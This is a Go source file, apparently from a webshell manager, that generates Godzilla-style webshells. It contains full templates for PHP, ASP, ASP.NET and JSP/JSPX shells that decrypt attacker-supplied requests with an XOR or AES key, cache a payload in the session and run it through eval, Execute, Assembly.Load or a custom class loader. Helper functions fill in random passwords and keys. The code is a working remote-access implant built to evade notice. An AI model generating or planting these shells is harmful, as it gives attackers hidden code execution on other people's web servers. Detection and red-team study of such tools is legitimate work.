package godzilla

import (
	"github.com/xiecat/wsm/lib/utils"
	"strings"
)

const (
	pwdFlag           = "{{PWD}}"
	keyFlag           = "{{KEY}}"
	phpShellAESBASE64 = "<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass='{{PWD}}'; $payloadName='payload'; $keyFlag='{{KEY}}'; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$keyFlag); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$keyFlag); eval($payload); echo substr(md5($pass.$keyFlag),0,16); echo base64_encode(encode(@run($data),$keyFlag)); echo substr(md5($pass.$keyFlag),16); }else{ if (stripos($data,\"getBasicsInfo\")!==false){ $_SESSION[$payloadName]=encode($data,$keyFlag); } } }"
	phpShellAESRAW    = "<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName='payload'; $keyFlag='{{KEY}}'; $data=file_get_contents(\"php://input\"); if ($data!==false){ $data=encode($data,$keyFlag); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$keyFlag); \t\teval($payload); echo encode(@run($data),$keyFlag); }else{ if (stripos($data,\"getBasicsInfo\")!==false){ $_SESSION[$payloadName]=encode($data,$keyFlag); } } }"

	aspShellXorBASE64 = `
<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(keyFlag)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(keyFlag,(i mod keySize)+1,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if

End Function
    keyFlag="{{KEY}}"
    content=request.Form("{{PWD}}")
    if not IsEmpty(content) then

        if  IsEmpty(Session("payload")) then
            content=decryption(Base64Decode(content),false)
            Session("payload")=content
            response.End
        else
            content=decryption(Base64Decode(content),true)
            bypassDictionary.Add "payload",Session("payload")
            Execute(bypassDictionary("payload"))
            result=run(content)
            response.Write("11cd6a")
            if not IsEmpty(result) then
                response.Write Base64Encode(decryption(result,true))
            end if
            response.Write("ac826a")
        end if
    end if
%>`
	aspShellXorRAW = `
<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(keyFlag)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(keyFlag,(i mod keySize)+1,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if

End Function
    keyFlag="{{KEY}}"
    content=Request.BinaryRead(Request.TotalBytes)
    if not IsEmpty(content) then

        if  IsEmpty(Session("payload")) then
            content=decryption(content,false)
            Session("payload")=content
            response.End
        else
            content=decryption(content,true)
            bypassDictionary.Add "payload",Session("payload")
            Execute(bypassDictionary("payload"))
            result=run(content)
            if not IsEmpty(result) then
                response.BinaryWrite decryption(result,true)
            end if
        end if
    end if
%>`

	csharpShellAESBASE64 = "<%@ Page Language=\"C#\"%><%try{string keyFlag = \"{{KEY}}\";string pass = \"{{PWD}}\";string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + keyFlag))).Replace(\"-\", \"\");byte[] data = System.Convert.FromBase64String(Context.Request[pass]);data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(keyFlag), System.Text.Encoding.Default.GetBytes(keyFlag)).TransformFinalBlock(data, 0, data.Length);if (Context.Session[\"payload\"] == null){ Context.Session[\"payload\"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(\"Load\", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ;}else{ object o = ((System.Reflection.Assembly)Context.Session[\"payload\"]).CreateInstance(\"LY\"); System.IO.MemoryStream outStream = new System.IO.MemoryStream();o.Equals(outStream);o.Equals(Context); o.Equals(data);o.ToString(); byte[] r = outStream.ToArray();outStream.Dispose(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(keyFlag), System.Text.Encoding.Default.GetBytes(keyFlag)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16));}}catch(System.Exception){} %>"
	csharpShellAESRAW    = "<%@ Page Language=\"C#\"%><%try{string keyFlag = \"{{KEY}}\";byte[] data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(keyFlag), System.Text.Encoding.Default.GetBytes(keyFlag)).TransformFinalBlock(Context.Request.BinaryRead(Context.Request.ContentLength), 0, Context.Request.ContentLength);if (Context.Session[\"payload\"] == null){ Context.Session[\"payload\"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(\"Load\", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });}else{ object o = ((System.Reflection.Assembly)Context.Session[\"payload\"]).CreateInstance(\"LY\"); System.IO.MemoryStream outStream = new System.IO.MemoryStream();o.Equals(outStream);o.Equals(Context); o.Equals(data);o.ToString();byte[] r = outStream.ToArray();outStream.Dispose();Context.Response.BinaryWrite(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(keyFlag), System.Text.Encoding.Default.GetBytes(keyFlag)).TransformFinalBlock(r, 0, r.Length));}}catch(System.Exception){} %>"

	jspShellAESBASE64 = "<%! String xc=\"{{KEY}}\"; String pass=\"{{PWD}}\"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\"MD5\");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(\"java.util.Base64\");Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\"encodeToString\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Encoder\"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\"encode\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(\"java.util.Base64\");Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\"decodeBuffer\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><% try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(pageContext.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\", new String(data));Object f=((Class)session.getAttribute(\"payload\")).newInstance();f.equals(pageContext);response.getWriter().write(md5.substring(0,16));response.getWriter().write(base64Encode(x(base64Decode(f.toString()), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>"
	jspShellAESRAW    = "<%! String xc=\"{{KEY}}\"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }}%><%try{byte[] data=new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))<data.length);data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\", data);Object f=((Class)session.getAttribute(\"payload\")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}%>"

	jspXShellAESBASE64 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\"><jsp:declaration> String xc=\"{{KEY}}\"; String pass=\"{{PWD}}\"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\"MD5\");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(\"java.util.Base64\");Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\"encodeToString\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Encoder\"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\"encode\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(\"java.util.Base64\");Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\"decodeBuffer\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }</jsp:declaration><jsp:scriptlet>try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(\"payload\")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}</jsp:scriptlet></jsp:root>"
	jspXShellAESRAW    = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\"><jsp:declaration> String xc=\"{{KEY}}\"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }}</jsp:declaration><jsp:scriptlet>try{byte[] data=new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\", data);Object f=((Class)session.getAttribute(\"payload\")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}</jsp:scriptlet></jsp:root>"
)

func GenRandShell(cryType CrypticType) (pass string, key string, shell string) {
	pass = utils.RandomRangeString(6, 12)
	key = utils.RandomRangeString(6, 12)
	return pass, key, genShell(pass, key, cryType)
}

func GenAssignShell(pass, key string, cryType CrypticType) string {
	return genShell(pass, key, cryType)
}

func genShell(pass, key string, cryType CrypticType) string {
	var content string
	pass = string(utils.SecretKey(pass))
	key = string(utils.SecretKey(key))
	switch cryType {
	case ASP_XOR_BASE64:
		content = strings.ReplaceAll(aspShellXorBASE64, keyFlag, key)
		content = strings.ReplaceAll(content, pwdFlag, pass)
	case ASP_XOR_RAW:
		content = strings.ReplaceAll(aspShellXorRAW, keyFlag, key)
	case PHP_XOR_BASE64:
		content = strings.ReplaceAll(phpShellAESBASE64, keyFlag, key)
		content = strings.ReplaceAll(content, pwdFlag, pass)
	case PHP_XOR_RAW:
		content = strings.ReplaceAll(phpShellAESRAW, keyFlag, key)
	case CSHARP_AES_BASE64:
		content = strings.ReplaceAll(csharpShellAESBASE64, keyFlag, key)
		content = strings.ReplaceAll(content, pwdFlag, pass)
	case CSHARP_AES_RAW:
		content = strings.ReplaceAll(csharpShellAESRAW, keyFlag, key)
	case JAVA_AES_BASE64:
		content = strings.ReplaceAll(jspShellAESBASE64, keyFlag, key)
		content = strings.ReplaceAll(content, pwdFlag, pass)
	case JAVA_AES_RAW:
		content = strings.ReplaceAll(jspShellAESRAW, keyFlag, key)
	}
	return content
}
